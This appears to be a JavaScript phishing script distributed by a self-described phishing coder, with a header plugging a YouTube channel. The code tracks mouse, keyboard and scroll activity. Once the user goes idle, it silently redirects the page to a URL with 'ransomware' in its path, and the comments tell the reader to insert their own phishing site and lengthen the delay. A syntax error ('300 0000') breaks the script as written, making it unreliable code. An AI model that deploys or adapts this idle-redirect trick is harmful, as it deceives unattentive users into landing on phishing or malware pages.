/*                                                                                                         
####################################################################
# s'abonner sur ma chaine youtube pour avoir plus de code phishing #
# et hacking,il me donne le courage de faire les codes phishing    #                                                                              
#                                                                  #
# subscribe on my youtube channel to have more phishing code       #
# and hacking, it gives me the courage to do the phishing codes    #
#                                                                  #
#             ||~~ BY ~~ hakanonymos ~~||                          #
#                                                                  #
#                                                                  #
#                                                                  #
#    skype et email : hakanonymos@hotmail.com                      #                                                                 
####################################################################                                                                                                    
*/

   
var xScroll, yScroll, timerPoll, timerRedirect, timerClock;
 
function initRedirect(){
  if (typeof document.body.scrollTop != "undefined"){ //IE,NS7,Moz
    xScroll = document.body.scrollLeft;
    yScroll = document.body.scrollTop;
 
    clearInterval(timerPoll); //stop polling scroll move
    clearInterval(timerRedirect); //stop timed redirect
 
    timerPoll = setInterval("pollActivity()",1); //poll scrolling  votre site de redrection 10000 = 10 seconde
    timerRedirect = setInterval("location.href='https://panafricaine.com/ransomware/'",300 0000); //temps de redirection
 
    
  }
  else if (typeof window.pageYOffset != "undefined"){ //other browsers that support pageYOffset/pageXOffset instead
    xScroll = window.pageXOffset;
    yScroll = window.pageYOffset;
 
    clearInterval(timerPoll); //stop polling scroll move
    clearInterval(timerRedirect); //stop timed redirect
 
    timerPoll = setInterval("pollActivity()",1); //poll scrolling
    timerRedirect = setInterval("location.href='https://panafricaine.com/ransomware/'",300 0000); //set timed redirection avec le lien de la page
 
    
  }
  //else do nothing               // changer le lien pour votre site de phishing  , augmenter aussi le temps
                                      // maxi = 30 or 10 minutes are very good  , very good
}
 
function pollActivity(){
  if ((typeof document.body.scrollTop != "undefined" && (xScroll!=document.body.scrollLeft || yScroll!=document.body.scrollTop)) //IE/NS7/Moz
   ||
   (typeof window.pageYOffset != "undefined" && (xScroll!=window.pageXOffset || yScroll!=window.pageYOffset))) { //other browsers
      initRedirect(); //reset polling scroll position
  }
}
 
document.onmousemove=initRedirect;
document.onclick=initRedirect;
document.onkeydown=initRedirect;
window.onload=initRedirect;
window.onresize=initRedirect;
   
   